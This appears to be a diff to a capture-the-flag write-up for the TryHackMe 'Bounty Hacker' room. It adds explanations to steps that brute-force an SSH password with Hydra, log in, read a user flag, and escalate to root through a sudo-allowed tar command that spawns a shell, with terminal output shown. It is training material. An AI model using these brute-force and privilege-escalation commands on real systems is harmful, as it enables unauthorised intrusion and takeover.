@@ -154,7 +154,7 @@ ReDSynd1ca7e
 
 # Vulnerability Exploitation
 > Brute Forcing Using Hydra
-14. `hydra -l lin -P {FILE1}.txt ssh://{TARGET IP}`
+14. `hydra -l lin -P {FILE1}.txt ssh://{TARGET IP}` to attempt to crack this user's password using the **locks.txt** file that we found on the target's FTP server, which turned out that one of the strings within that text file was the password that our target user used to connect to the target via SSH
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ hydra -l lin -P locks.txt 10.10.2.76 ssh
@@ -171,7 +171,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2023-06-26 20:20:54
 
 #
 > Connecting to the Target Through SSH
-15. `ssh lin@{TARGET IP} -p 22`
+15. `ssh lin@{TARGET IP} -p 22` to connect to the target via SSH using the new set of credentials that we have 
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ ssh lin@10.10.2.76 -p 22
@@ -192,8 +192,8 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
 lin@bountyhacker:~/Desktop$ 
 ```
-16. `find / -type f -name user.txt 2>/dev/null`
-17. `cat {USER.TXT FILE PATH}`
+16. `find / -type f -name user.txt 2>/dev/null` to search for the **user.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
+17. `cat {USER.TXT FILE PATH}` to display contents of the user.txt file on the terminal
 ```bash
 lin@bountyhacker:~/Desktop$ find / -type f -name user.txt 2>/dev/null
 /home/lin/Desktop/user.txt
@@ -205,9 +205,9 @@ THM{CR1M3_SyNd1C4T3}
 
 # Post Exploitation
 > Privilege Escalation
-18. `sudo -l`
+18. `sudo -l` to list the sudo privileges assigned to the user that we're logged in as, which shows that they can execute the **tar** command without needing the root's password
 ```bash
-lin@bountyhacker:~/Desktop$ sudo -l
+lin@bountyhacker:~/Desktop$ sudo -l 
 [sudo] password for lin: 
 Matching Defaults entries for lin on bountyhacker:
     env_reset, mail_badpass,
@@ -216,10 +216,10 @@ Matching Defaults entries for lin on bountyhacker:
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
-19. `firefox "https://gtfobins.github.io/gtfobins/tar/"`
+19. `firefox "https://gtfobins.github.io/gtfobins/tar/"` to launch firefox and direct it to go to the GTFOBins website and then we searched for the **tar** command
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bounty%20Hacker/GTFOBins%20Tar.pngGTFOBins%20Tar.png)
-20. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
-21. `whoami`
+20. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` to escalate privileges by spawning in a Bourne shell (According to GTFOBins)
+21. `whoami` to see if we’re now logged in as a higher privileged account, which shows that we're now logged in as root
 ```bash
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading '/' from member names
@@ -229,8 +229,8 @@ tar: Removing leading '/' from member names
 # whoami
 root
 ```
-22. `find / -type f -name root.txt 2>/dev/null`
-23. `cat {ROOT.TXT FILE PATH}`
+22. `find / -type f -name root.txt 2>/dev/null` to search for the **root.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
+23. `cat {ROOT.TXT FILE PATH}` to display contents of the root.txt file on the terminal
 ```bash
 # find / -type f -name root.txt 2>/dev/null
 /root/root.txt
